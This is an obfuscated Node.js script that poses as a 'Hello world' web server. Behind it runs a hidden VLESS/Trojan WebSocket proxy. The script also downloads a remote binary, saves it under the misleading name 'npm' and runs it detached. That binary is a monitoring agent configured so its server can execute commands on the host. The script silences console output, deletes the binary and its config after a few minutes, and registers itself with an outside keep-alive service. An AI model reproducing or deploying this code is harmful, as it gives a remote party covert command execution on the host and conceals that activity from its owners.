const _0x22c1=['application/dns-json','&fp=chrome&type=ws&host=','digest','createHash','finish','8.8.4.4','\x20-p\x20','createServer','createWriteStream','&path=%2F','message','npm\x20is\x20already\x20running,\x20skip\x20running...','catch','readUInt8','end','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','apply','close','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','client_secret:\x20','every','2096','error:\x20','error','once','&type=A','sub','write','readUInt16BE','reduce','crypto','sha224','substr','debug','utf8','AUTO_ACCESS','1234.abc.com','stream','child_process','slice','arm','https://api.ip.sb/geoip','application/json','Status','log','https://arm64.ssss.nyc.mn/v1','connection','Server','aarch64','connect','https://dns.google/resolve?name=','2053','--tls','utf-8','length','{}.constructor(\x22return\x20this\x22)(\x20)','url','pipe','Unknown','console','Hello\x20world!','data','writeHead','get','return\x20/\x22\x20+\x20this\x20+\x20\x22/','exception','DOMAIN','toString','https://amd64.ssss.nyc.mn/v1','index.html','Answer','npm','update','then','unlink','from','warn','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','7043abc5-0257-488c-b10e-61af5a9a6655','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','env','Failed\x20to\x20resolve\x20','setsid\x20nohup\x20./npm\x20-s\x20','path','info','UUID','test','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','join','SUB_PATH','arch','base64','443','npm\x20download\x20successfully','true'];const _0x14f9=function(_0x22c1cc,_0x14f93b){_0x22c1cc=_0x22c1cc-0x0;let _0xa828cd=_0x22c1[_0x22c1cc];return _0xa828cd;};const _0x3f42c5=function(){let _0x2381ae=!![];return function(_0x570631,_0x598948){const _0x75f9c=_0x2381ae?function(){if(_0x598948){const _0x2534c0=_0x598948[_0x14f9('0x10')](_0x570631,arguments);_0x598948=null;return _0x2534c0;}}:function(){};_0x2381ae=![];return _0x75f9c;};}();const _0x12895d=_0x3f42c5(this,function(){const _0x598c1f=function(){const _0x216d2d=_0x598c1f['constructor'](_0x14f9('0x40'))()['compile'](_0x14f9('0x4d'));return!_0x216d2d[_0x14f9('0x56')](_0x12895d);};return _0x598c1f();});_0x12895d();const _0x10abad=function(){let _0x5aaed3=!![];return function(_0x138d8d,_0x131388){const _0x472fb9=_0x5aaed3?function(){if(_0x131388){const _0x400ce1=_0x131388[_0x14f9('0x10')](_0x138d8d,arguments);_0x131388=null;return _0x400ce1;}}:function(){};_0x5aaed3=![];return _0x472fb9;};}();const _0xa5761=_0x10abad(this,function(){const _0x2d3e7c=function(){};const _0x44d3b8=function(){let _0x3112ba;try{_0x3112ba=Function('return\x20(function()\x20'+_0x14f9('0x37')+');')();}catch(_0x406390){_0x3112ba=window;}return _0x3112ba;};const _0x3bb512=_0x44d3b8();if(!_0x3bb512[_0x14f9('0x3b')]){_0x3bb512[_0x14f9('0x3b')]=function(_0x33a8d5){const _0x31739d={};_0x31739d['log']=_0x33a8d5;_0x31739d['warn']=_0x33a8d5;_0x31739d[_0x14f9('0x21')]=_0x33a8d5;_0x31739d[_0x14f9('0x54')]=_0x33a8d5;_0x31739d[_0x14f9('0x17')]=_0x33a8d5;_0x31739d['exception']=_0x33a8d5;_0x31739d['table']=_0x33a8d5;_0x31739d['trace']=_0x33a8d5;return _0x31739d;}(_0x2d3e7c);}else{_0x3bb512['console'][_0x14f9('0x2c')]=_0x2d3e7c;_0x3bb512['console'][_0x14f9('0x4c')]=_0x2d3e7c;_0x3bb512['console'][_0x14f9('0x21')]=_0x2d3e7c;_0x3bb512[_0x14f9('0x3b')]['info']=_0x2d3e7c;_0x3bb512[_0x14f9('0x3b')][_0x14f9('0x17')]=_0x2d3e7c;_0x3bb512[_0x14f9('0x3b')][_0x14f9('0x41')]=_0x2d3e7c;_0x3bb512[_0x14f9('0x3b')]['table']=_0x2d3e7c;_0x3bb512['console']['trace']=_0x2d3e7c;}});_0xa5761();const os=require('os');const http=require('http');const fs=require('fs');const axios=require('axios');const net=require('net');const path=require(_0x14f9('0x53'));const crypto=require(_0x14f9('0x1e'));const {Buffer}=require('buffer');const {exec,execSync}=require(_0x14f9('0x26'));const {WebSocket,createWebSocketStream}=require('ws');const UUID=process[_0x14f9('0x50')][_0x14f9('0x55')]||_0x14f9('0x4e');const NEZHA_SERVER=process[_0x14f9('0x50')]['NEZHA_SERVER']||'';const NEZHA_PORT=process[_0x14f9('0x50')]['NEZHA_PORT']||'';const NEZHA_KEY=process['env']['NEZHA_KEY']||'';const DOMAIN=process['env'][_0x14f9('0x42')]||_0x14f9('0x24');const AUTO_ACCESS=process['env'][_0x14f9('0x23')]||!![];const WSPATH=process['env']['WSPATH']||UUID['slice'](0x0,0x8);const SUB_PATH=process[_0x14f9('0x50')][_0x14f9('0x59')]||_0x14f9('0x1a');const NAME=process['env']['NAME']||'';const PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{try{const _0x47fa58=await axios[_0x14f9('0x3f')](_0x14f9('0x29'));const _0x3933b3=_0x47fa58[_0x14f9('0x3d')];ISP=(_0x3933b3['country_code']+'-'+_0x3933b3['isp'])['replace'](/ /g,'_');}catch(_0xa46d3){ISP=_0x14f9('0x3a');}};GetISP();const httpServer=http[_0x14f9('0x7')]((_0x14bb81,_0x3f269b)=>{if(_0x14bb81['url']==='/'){const _0x4d01cd=path[_0x14f9('0x58')](__dirname,_0x14f9('0x45'));fs['readFile'](_0x4d01cd,_0x14f9('0x22'),(_0x14766d,_0x54fdfc)=>{if(_0x14766d){_0x3f269b[_0x14f9('0x3e')](0xc8,{'Content-Type':'text/html'});_0x3f269b['end'](_0x14f9('0x3c'));return;}_0x3f269b[_0x14f9('0x3e')](0xc8,{'Content-Type':'text/html'});_0x3f269b['end'](_0x54fdfc);});return;}else if(_0x14bb81[_0x14f9('0x38')]==='/'+SUB_PATH){const _0x16e36a=NAME?NAME+'-'+ISP:ISP;const _0x2d3500='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x14f9('0x1')+DOMAIN+_0x14f9('0x9')+WSPATH+'#'+_0x16e36a;const _0x5339cd='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x14f9('0x9')+WSPATH+'#'+_0x16e36a;const _0x4ead02=_0x2d3500+'\x0a'+_0x5339cd;const _0x16b04e=Buffer[_0x14f9('0x4b')](_0x4ead02)['toString'](_0x14f9('0x5b'));_0x3f269b['writeHead'](0xc8,{'Content-Type':'text/plain'});_0x3f269b['end'](_0x16b04e+'\x0a');}else{_0x3f269b[_0x14f9('0x3e')](0x194,{'Content-Type':'text/plain'});_0x3f269b[_0x14f9('0xe')]('Not\x20Found\x0a');}});const wss=new WebSocket[(_0x14f9('0x2f'))]({'server':httpServer});const uuid=UUID['replace'](/-/g,'');const DNS_SERVERS=[_0x14f9('0x5'),'1.1.1.1'];function resolveHost(_0x27f222){return new Promise((_0x41f767,_0xe8c8d5)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x27f222)){_0x41f767(_0x27f222);return;}let _0x2fc33=0x0;function _0x5df3c4(){if(_0x2fc33>=DNS_SERVERS['length']){_0xe8c8d5(new Error(_0x14f9('0x51')+_0x27f222+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x52ee67=DNS_SERVERS[_0x2fc33];_0x2fc33++;const _0x158fbd=_0x14f9('0x32')+encodeURIComponent(_0x27f222)+_0x14f9('0x19');axios['get'](_0x158fbd,{'timeout':0x1388,'headers':{'Accept':_0x14f9('0x0')}})['then'](_0xc8f39f=>{const _0x38fe90=_0xc8f39f['data'];if(_0x38fe90[_0x14f9('0x2b')]===0x0&&_0x38fe90[_0x14f9('0x46')]&&_0x38fe90[_0x14f9('0x46')][_0x14f9('0x36')]>0x0){const _0x3d8c85=_0x38fe90['Answer']['find'](_0x75dbd4=>_0x75dbd4['type']===0x1);if(_0x3d8c85){_0x41f767(_0x3d8c85[_0x14f9('0x3d')]);return;}}_0x5df3c4();})['catch'](_0x110cfe=>{_0x5df3c4();});}_0x5df3c4();});}function handleVlessConnection(_0x28e1d5,_0x5045fd){const [_0x1f841d]=_0x5045fd;const _0x5c6de1=_0x5045fd[_0x14f9('0x27')](0x1,0x11);if(!_0x5c6de1[_0x14f9('0x14')]((_0x3a9109,_0x364175)=>_0x3a9109==parseInt(uuid[_0x14f9('0x20')](_0x364175*0x2,0x2),0x10)))return![];let _0x5b31d3=_0x5045fd[_0x14f9('0x27')](0x11,0x12)['readUInt8']()+0x13;const _0x451d2b=_0x5045fd[_0x14f9('0x27')](_0x5b31d3,_0x5b31d3+=0x2)[_0x14f9('0x1c')](0x0);const _0x3dee92=_0x5045fd[_0x14f9('0x27')](_0x5b31d3,_0x5b31d3+=0x1)[_0x14f9('0xd')]();const _0x215b68=_0x3dee92==0x1?_0x5045fd[_0x14f9('0x27')](_0x5b31d3,_0x5b31d3+=0x4)[_0x14f9('0x58')]('.'):_0x3dee92==0x2?new TextDecoder()['decode'](_0x5045fd[_0x14f9('0x27')](_0x5b31d3+0x1,_0x5b31d3+=0x1+_0x5045fd[_0x14f9('0x27')](_0x5b31d3,_0x5b31d3+0x1)['readUInt8']())):_0x3dee92==0x3?_0x5045fd['slice'](_0x5b31d3,_0x5b31d3+=0x10)[_0x14f9('0x1d')]((_0x3d69b9,_0x53a49f,_0x2cf4a6,_0x1e3966)=>_0x2cf4a6%0x2?_0x3d69b9['concat'](_0x1e3966['slice'](_0x2cf4a6-0x1,_0x2cf4a6+0x1)):_0x3d69b9,[])['map'](_0xce878f=>_0xce878f[_0x14f9('0x1c')](0x0)[_0x14f9('0x43')](0x10))[_0x14f9('0x58')](':'):'';_0x28e1d5['send'](new Uint8Array([_0x1f841d,0x0]));const _0x51966a=createWebSocketStream(_0x28e1d5);resolveHost(_0x215b68)['then'](_0x2fe2fb=>{net[_0x14f9('0x31')]({'host':_0x2fe2fb,'port':_0x451d2b},function(){this[_0x14f9('0x1b')](_0x5045fd['slice'](_0x5b31d3));_0x51966a['on'](_0x14f9('0x17'),()=>{})[_0x14f9('0x39')](this)['on'](_0x14f9('0x17'),()=>{})[_0x14f9('0x39')](_0x51966a);})['on'](_0x14f9('0x17'),()=>{});})[_0x14f9('0xc')](_0x3de24c=>{net['connect']({'host':_0x215b68,'port':_0x451d2b},function(){this[_0x14f9('0x1b')](_0x5045fd['slice'](_0x5b31d3));_0x51966a['on'](_0x14f9('0x17'),()=>{})[_0x14f9('0x39')](this)['on']('error',()=>{})['pipe'](_0x51966a);})['on']('error',()=>{});});return!![];}function handleTrojanConnection(_0xa00db5,_0x114fd4){try{if(_0x114fd4['length']<0x3a)return![];const _0x6788da=_0x114fd4[_0x14f9('0x27')](0x0,0x38)[_0x14f9('0x43')]();const _0x1affe0=[UUID];let _0x3a394e=null;for(const _0x78a0b8 of _0x1affe0){const _0x3bcd8d=crypto[_0x14f9('0x3')](_0x14f9('0x1f'))[_0x14f9('0x48')](_0x78a0b8)[_0x14f9('0x2')]('hex');if(_0x3bcd8d===_0x6788da){_0x3a394e=_0x78a0b8;break;}}if(!_0x3a394e)return![];let _0x51f5bc=0x38;if(_0x114fd4[_0x51f5bc]===0xd&&_0x114fd4[_0x51f5bc+0x1]===0xa){_0x51f5bc+=0x2;}const _0x43818c=_0x114fd4[_0x51f5bc];if(_0x43818c!==0x1)return![];_0x51f5bc+=0x1;const _0x5e374f=_0x114fd4[_0x51f5bc];_0x51f5bc+=0x1;let _0x5dd49f,_0x3d1a96;if(_0x5e374f===0x1){_0x5dd49f=_0x114fd4[_0x14f9('0x27')](_0x51f5bc,_0x51f5bc+0x4)[_0x14f9('0x58')]('.');_0x51f5bc+=0x4;}else if(_0x5e374f===0x3){const _0x4b73dc=_0x114fd4[_0x51f5bc];_0x51f5bc+=0x1;_0x5dd49f=_0x114fd4[_0x14f9('0x27')](_0x51f5bc,_0x51f5bc+_0x4b73dc)[_0x14f9('0x43')]();_0x51f5bc+=_0x4b73dc;}else if(_0x5e374f===0x4){_0x5dd49f=_0x114fd4[_0x14f9('0x27')](_0x51f5bc,_0x51f5bc+0x10)[_0x14f9('0x1d')]((_0x50feeb,_0xbf8ea,_0x33f719,_0x3bd2ec)=>_0x33f719%0x2?_0x50feeb['concat'](_0x3bd2ec['slice'](_0x33f719-0x1,_0x33f719+0x1)):_0x50feeb,[])['map'](_0x292c0b=>_0x292c0b[_0x14f9('0x1c')](0x0)[_0x14f9('0x43')](0x10))['join'](':');_0x51f5bc+=0x10;}else{return![];}_0x3d1a96=_0x114fd4['readUInt16BE'](_0x51f5bc);_0x51f5bc+=0x2;if(_0x51f5bc<_0x114fd4[_0x14f9('0x36')]&&_0x114fd4[_0x51f5bc]===0xd&&_0x114fd4[_0x51f5bc+0x1]===0xa){_0x51f5bc+=0x2;}const _0x44a752=createWebSocketStream(_0xa00db5);resolveHost(_0x5dd49f)[_0x14f9('0x49')](_0x4ae6a7=>{net['connect']({'host':_0x4ae6a7,'port':_0x3d1a96},function(){if(_0x51f5bc<_0x114fd4['length']){this[_0x14f9('0x1b')](_0x114fd4['slice'](_0x51f5bc));}_0x44a752['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x44a752);})['on'](_0x14f9('0x17'),()=>{});})[_0x14f9('0xc')](_0x550690=>{net[_0x14f9('0x31')]({'host':_0x5dd49f,'port':_0x3d1a96},function(){if(_0x51f5bc<_0x114fd4['length']){this[_0x14f9('0x1b')](_0x114fd4[_0x14f9('0x27')](_0x51f5bc));}_0x44a752['on'](_0x14f9('0x17'),()=>{})['pipe'](this)['on'](_0x14f9('0x17'),()=>{})['pipe'](_0x44a752);})['on'](_0x14f9('0x17'),()=>{});});return!![];}catch(_0x2ace51){return![];}}wss['on'](_0x14f9('0x2e'),(_0xa2a294,_0x4b6859)=>{const _0x2641c3=_0x4b6859[_0x14f9('0x38')]||'';_0xa2a294[_0x14f9('0x18')](_0x14f9('0xa'),_0x14683f=>{if(_0x14683f[_0x14f9('0x36')]>0x11&&_0x14683f[0x0]===0x0){const _0x5af744=_0x14683f['slice'](0x1,0x11);const _0x327b06=_0x5af744['every']((_0x1bfd0d,_0x425ed3)=>_0x1bfd0d==parseInt(uuid[_0x14f9('0x20')](_0x425ed3*0x2,0x2),0x10));if(_0x327b06){if(!handleVlessConnection(_0xa2a294,_0x14683f)){_0xa2a294[_0x14f9('0x11')]();}return;}}if(!handleTrojanConnection(_0xa2a294,_0x14683f)){_0xa2a294['close']();}})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x2fb457=os[_0x14f9('0x5a')]();if(_0x2fb457===_0x14f9('0x28')||_0x2fb457==='arm64'||_0x2fb457===_0x14f9('0x30')){if(!NEZHA_PORT){return _0x14f9('0x2d');}else{return'https://arm64.ssss.nyc.mn/agent';}}else{if(!NEZHA_PORT){return _0x14f9('0x44');}else{return'https://amd64.ssss.nyc.mn/agent';}}};const downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x13a7a1=getDownloadUrl();const _0x465c6f=await axios({'method':_0x14f9('0x3f'),'url':_0x13a7a1,'responseType':_0x14f9('0x25')});const _0x104402=fs[_0x14f9('0x8')](_0x14f9('0x47'));_0x465c6f['data'][_0x14f9('0x39')](_0x104402);return new Promise((_0x224205,_0x2a5e04)=>{_0x104402['on'](_0x14f9('0x4'),()=>{console['log'](_0x14f9('0x5d'));exec('chmod\x20+x\x20npm',_0x1137d3=>{if(_0x1137d3)_0x2a5e04(_0x1137d3);_0x224205();});});_0x104402['on']('error',_0x2a5e04);});}catch(_0x246d45){throw _0x246d45;}};const runnz=async()=>{try{const _0x138c89=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x14f9('0x35')});if(_0x138c89['trim']()!==''){console['log'](_0x14f9('0xb'));return;}}catch(_0x1ba3aa){}await downloadFile();let _0x5effd7='';let _0x55ea33=[_0x14f9('0x5c'),'8443',_0x14f9('0x15'),'2087','2083',_0x14f9('0x33')];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4d0ae2=_0x55ea33['includes'](NEZHA_PORT)?_0x14f9('0x34'):'';_0x5effd7=_0x14f9('0x52')+NEZHA_SERVER+':'+NEZHA_PORT+_0x14f9('0x6')+NEZHA_KEY+'\x20'+_0x4d0ae2+_0x14f9('0x57');}else if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5794b2=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')['pop']():'';const _0x7f73b4=_0x55ea33['includes'](_0x5794b2)?_0x14f9('0x5e'):'false';const _0x559899=_0x14f9('0x13')+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x14f9('0xf')+_0x7f73b4+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync']('config.yaml',_0x559899);}_0x5effd7=_0x14f9('0x4f');}else{console['log'](_0x14f9('0x12'));return;}try{exec(_0x5effd7,{'shell':'/bin/bash'},_0x3c158c=>{if(_0x3c158c)console['error']('npm\x20running\x20error:',_0x3c158c);else console[_0x14f9('0x2c')]('npm\x20is\x20running');});}catch(_0x2d5672){console[_0x14f9('0x17')](_0x14f9('0x16')+_0x2d5672);}};async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN){return;}const _0x3593cf='https://'+DOMAIN;try{const _0x2ebcc4=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x3593cf},{'headers':{'Content-Type':_0x14f9('0x2a')}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x2ccc44){}}const delFiles=()=>{fs['unlink'](_0x14f9('0x47'),()=>{});fs[_0x14f9('0x4a')]('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{runnz();setTimeout(()=>{delFiles();},0x2bf20);addAccessTask();console[_0x14f9('0x2c')]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
